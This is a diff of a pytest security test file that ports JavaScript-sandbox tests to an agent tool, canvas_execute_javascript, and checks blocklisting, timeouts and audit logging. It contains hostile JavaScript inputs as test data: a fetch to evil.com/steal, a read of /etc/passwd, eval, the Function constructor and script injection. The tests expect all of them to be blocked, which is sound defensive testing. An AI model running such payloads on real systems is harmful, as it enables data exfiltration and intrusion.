@@ -5,15 +5,24 @@ Tests cover:
 - JavaScript sandboxing
 - JavaScript validation
 - Dangerous JavaScript blocking
+
+Ported to the current architecture: canvas JavaScript execution is no longer
+an HTTP endpoint (`POST /api/canvas/{id}/execute` was removed). The execution
+surface is the agent tool ``tools.canvas_tool.canvas_execute_javascript``,
+which gates on governance (AUTONOMOUS only), screens the code against a
+dangerous-pattern blocklist, and relays the payload to the user's browser
+sandbox over WebSocket with a bounded timeout.
 """
+import asyncio
+import uuid
+from unittest.mock import AsyncMock, Mock, patch
+
 import pytest
 from fastapi.testclient import TestClient
 from sqlalchemy.orm import Session
-from tests.factories.canvas_factory import CanvasAuditFactory
 from tests.factories.agent_factory import AutonomousAgentFactory
-from core.models import CanvasAudit
-from unittest.mock import Mock, patch
-import uuid
+from core.models import CanvasAudit, AgentExecution
+from tools.canvas_tool import canvas_execute_javascript
 
 
 # Malicious JavaScript payloads
@@ -59,104 +68,88 @@ SAFE_JS_PATTERNS = [
 ]
 
 
+def _execute(client: TestClient, auth_token: str, db_session: Session,
+             javascript: str, agent, canvas_id: str = None):
+    """Run the real canvas_execute_javascript tool against the test DB."""
+    canvas_id = canvas_id or str(uuid.uuid4())
+    result = asyncio.run(canvas_execute_javascript(
+        user_id="integration-test-user",
+        canvas_id=canvas_id,
+        javascript=javascript,
+        agent_id=agent.id,
+    ))
+    return canvas_id, result
+
+
+@pytest.fixture
+def autonomous_agent(db_session: Session):
+    """Committed AUTONOMOUS agent visible to the tool's own DB session."""
+    agent = AutonomousAgentFactory(_session=db_session)
+    db_session.commit()
+    return agent
+
+
 class TestJavaScriptSandboxing:
     """Test JavaScript execution sandboxing."""
 
-    def test_javascript_execution_isolated(self, client: TestClient, auth_token: str, db_session: Session):
-        """Test JavaScript execution is isolated from main process."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
+    def test_javascript_execution_isolated(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
+        """Test JavaScript execution is isolated from main process.
 
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        # Try to exit process (should be blocked)
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "process.exit(1)"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        The server-side guard must reject Node-style process access before
+        anything is relayed to the client sandbox.
+        """
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "process.exit(1)", autonomous_agent,
         )
 
-        # Should block dangerous process access
-        assert response.status_code in [403, 400, 404, 405]
+        assert result["success"] is False
+        assert "dangerous pattern" in result["error"]
 
-    def test_javascript_no_filesystem_access(self, client: TestClient, auth_token: str, db_session: Session):
+    def test_javascript_no_filesystem_access(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
         """Test JavaScript cannot access filesystem."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
-
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        # Try to read files (should be blocked)
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "require('fs').readFileSync('/etc/passwd')"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "require('fs').readFileSync('/etc/passwd')", autonomous_agent,
         )
 
-        # Should block filesystem access
-        assert response.status_code in [403, 400, 404, 405]
+        assert result["success"] is False
+        assert "dangerous pattern" in result["error"]
 
-    def test_javascript_no_network_access(self, client: TestClient, auth_token: str, db_session: Session):
+    def test_javascript_no_network_access(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
         """Test JavaScript cannot make network requests."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
-
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        # Try to make network request (should be blocked)
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "fetch('https://evil.com/steal')"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "fetch('https://evil.com/steal')", autonomous_agent,
         )
 
-        # Should block network access
-        assert response.status_code in [403, 400, 404, 405]
+        assert result["success"] is False
+        assert "dangerous pattern" in result["error"]
 
-    def test_javascript_execution_timeout(self, client: TestClient, auth_token: str, db_session: Session):
-        """Test JavaScript execution has timeout."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
+    def test_javascript_execution_timeout(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
+        """Test JavaScript execution has a bounded timeout.
 
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
+        Infinite loops are a client-sandbox concern; the server must relay the
+        execution with a finite timeout_ms so the sandbox can kill it.
+        """
+        mock_ws = Mock()
+        mock_ws.broadcast = AsyncMock()
 
-        # Infinite loop (should timeout)
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "while(true) {}"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
-        )
+        with patch('tools.canvas_tool.ws_manager', mock_ws):
+            canvas_id, result = _execute(
+                client, auth_token, db_session,
+                "while(true) {}", autonomous_agent,
+            )
 
-        # Should timeout gracefully
-        assert response.status_code in [200, 201, 408, 500, 404, 405]
+        assert result["success"] is True
+
+        # The relayed execution request must carry a finite timeout
+        mock_ws.broadcast.assert_called_once()
+        channel, message = mock_ws.broadcast.call_args[0]
+        assert channel == "user:integration-test-user"
+        assert message["type"] == "canvas:execute"
+        assert message["data"]["action"] == "execute_javascript"
+        assert 0 < message["data"]["timeout_ms"] <= 30000
 
 
 class TestJavaScriptValidation:
@@ -207,225 +200,147 @@ class TestJavaScriptValidation:
                 assert data.get("valid") is False or "dangerous" in str(data).lower()
 
     @pytest.mark.parametrize("safe_code", SAFE_JS_PATTERNS)
-    def test_safe_patterns_allowed(self, client: TestClient, auth_token: str, safe_code):
-        """Test safe JavaScript patterns are allowed."""
-        canvas_id = str(uuid.uuid4())
-
-        response = client.post(
-            f"/api/canvas/{canvas_id}/validate",
-            json={"javascript": safe_code},
-            headers={"Authorization": f"Bearer {auth_token}"}
+    def test_safe_patterns_allowed(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent, safe_code):
+        """Test safe JavaScript patterns are allowed through the tool."""
+        canvas_id, result = _execute(
+            client, auth_token, db_session, safe_code, autonomous_agent,
         )
 
-        # Validation endpoint may not exist
-        if response.status_code == 200:
-            data = response.json()
-            assert data.get("valid") is not False
+        assert result["success"] is True
+        assert result["javascript_length"] == len(safe_code)
 
 
 class TestDangerousJavaScriptBlocking:
     """Test blocking of dangerous JavaScript patterns."""
 
     @pytest.mark.parametrize("malicious_code", MALICIOUS_JS_PATTERNS)
-    def test_malicious_patterns_blocked(self, client: TestClient, auth_token: str, malicious_code):
+    def test_malicious_patterns_blocked(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent, malicious_code):
         """Test malicious JavaScript patterns are blocked."""
-        agent = AutonomousAgentFactory()
-        db_session = None  # Will use fixture
-
-        canvas_id = str(uuid.uuid4())
-
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": malicious_code
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        canvas_id, result = _execute(
+            client, auth_token, db_session, malicious_code, autonomous_agent,
         )
 
-        # Should block malicious patterns
-        assert response.status_code in [403, 400, 404, 405]
+        assert result["success"] is False
+        assert "dangerous pattern" in result["error"]
 
-    def test_eval_blocked(self, client: TestClient, auth_token: str, db_session: Session):
+    def test_eval_blocked(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
         """Test eval() is blocked."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
-
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "eval('alert(1)')"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "eval('alert(1)')", autonomous_agent,
         )
 
-        # Should block eval()
-        assert response.status_code in [403, 400, 404, 405]
+        assert result["success"] is False
+        assert "dangerous pattern" in result["error"]
 
-    def test_function_constructor_blocked(self, client: TestClient, auth_token: str, db_session: Session):
+    def test_function_constructor_blocked(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
         """Test Function() constructor is blocked."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
-
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "new Function('return malicious')()"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "new Function('return malicious')()", autonomous_agent,
         )
 
-        # Should block Function constructor
-        assert response.status_code in [403, 400, 404, 405]
+        assert result["success"] is False
+        assert "dangerous pattern" in result["error"]
 
-    def test_dom_manipulation_blocked(self, client: TestClient, auth_token: str, db_session: Session):
+    def test_dom_manipulation_blocked(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
         """Test dangerous DOM manipulation is blocked."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
-
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "document.body.innerHTML = '<script>alert(1)</script>'"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "document.body.innerHTML = '<script>alert(1)</script>'", autonomous_agent,
         )
 
-        # Should block dangerous DOM manipulation
-        assert response.status_code in [403, 400, 404, 405]
+        assert result["success"] is False
+        assert "dangerous pattern" in result["error"]
 
 
 class TestJavaScriptContentSecurityPolicy:
-    """Test JavaScript Content Security Policy."""
+    """Test the server-side equivalent of the CSP contract: code is relayed
+    as data to the user's isolated channel, never executed server-side, and
+    inline script injection is rejected outright."""
 
-    def test_csp_restrictions(self, client: TestClient, auth_token: str, db_session: Session):
-        """Test CSP headers restrict JavaScript execution."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
+    def test_csp_restrictions(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
+        """Test safe code is relayed sandboxed: isolated user channel + bounded timeout."""
+        mock_ws = Mock()
+        mock_ws.broadcast = AsyncMock()
 
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
+        with patch('tools.canvas_tool.ws_manager', mock_ws):
+            canvas_id, result = _execute(
+                client, auth_token, db_session,
+                "console.log('test');", autonomous_agent,
+            )
 
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "console.log('test');"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        assert result["success"] is True
+
+        mock_ws.broadcast.assert_called_once()
+        channel, message = mock_ws.broadcast.call_args[0]
+        # Execution is scoped to the owning user's channel only
+        assert channel == "user:integration-test-user"
+        assert message["data"]["canvas_id"] == canvas_id
+        # Bounded execution window for the client sandbox
+        assert 0 < message["data"]["timeout_ms"] <= 30000
+
+    def test_inline_script_blocking(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
+        """Test inline script injection is blocked."""
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "<script>alert('inline')</script>", autonomous_agent,
         )
 
-        # Check CSP headers in response
-        if response.status_code in [200, 201]:
-            csp_header = response.headers.get("Content-Security-Policy", "")
-            # Should have CSP restrictions
-            assert isinstance(csp_header, str)
-
-    def test_inline_script_blocking(self, client: TestClient, auth_token: str, db_session: Session):
-        """Test inline scripts are blocked by CSP."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
-
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "<script>alert('inline')</script>"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
-        )
-
-        # Should block inline scripts
-        assert response.status_code in [403, 400, 404, 405]
+        assert result["success"] is False
+        assert "dangerous pattern" in result["error"]
 
 
 class TestJavaScriptAuditLogging:
     """Test JavaScript security audit logging."""
 
-    def test_malicious_javascript_logged(self, client: TestClient, auth_token: str, db_session: Session):
-        """Test malicious JavaScript attempts are logged."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
-
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "eval(malicious)"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+    def test_malicious_javascript_logged(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
+        """Test malicious JavaScript attempts are logged in the audit trail."""
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "eval(malicious)", autonomous_agent,
         )
+
+        assert result["success"] is False
 
         # Should log security event
         audits = db_session.query(CanvasAudit).filter(
-            CanvasAudit.id == canvas_id
+            CanvasAudit.canvas_id == canvas_id,
+            CanvasAudit.agent_id == autonomous_agent.id,
         ).all()
 
-        # Should have audit record for security event
+        # Should have audit record for the security event
         assert len(audits) >= 1
 
-    def test_security_violation_metadata(self, client: TestClient, auth_token: str, db_session: Session):
+    def test_security_violation_metadata(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
         """Test security violations include metadata."""
-        agent = AutonomousAgentFactory()
-        db_session.add(agent)
-        db_session.commit()
-
-        canvas_id = str(uuid.uuid4())
-        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
-        db_session.add(canvas)
-        db_session.commit()
-
-        response = client.post(
-            f"/api/canvas/{canvas_id}/execute",
-            json={
-                "action": "execute_javascript",
-                "code": "fetch('https://evil.com')"
-            },
-            headers={"Authorization": f"Bearer {auth_token}"}
+        canvas_id, result = _execute(
+            client, auth_token, db_session,
+            "fetch('https://evil.com')", autonomous_agent,
         )
+
+        assert result["success"] is False
 
         # Check audit metadata includes security details
         audits = db_session.query(CanvasAudit).filter(
-            CanvasAudit.id == canvas_id
+            CanvasAudit.canvas_id == canvas_id,
+            CanvasAudit.agent_id == autonomous_agent.id,
         ).all()
 
-        if audits and audits[0].audit_metadata:
-            # Should include security violation details
-            metadata = audits[0].audit_metadata
-            assert isinstance(metadata, dict)
+        assert len(audits) >= 1
+        details = audits[0].details_json or {}
+        assert isinstance(details, dict)
+        # Should include security violation details
+        assert details.get("blocked") is True
+        assert details.get("security_violation")
+        assert details.get("governance_check_passed") is False
+
+        # The linked execution must be failed, not left dangling as running
+        execution_id = details.get("agent_execution_id")
+        if execution_id:
+            execution = db_session.query(AgentExecution).filter(
+                AgentExecution.id == execution_id
+            ).first()
+            assert execution is not None
+            assert execution.status == "failed"
+            assert execution.error_message is not None
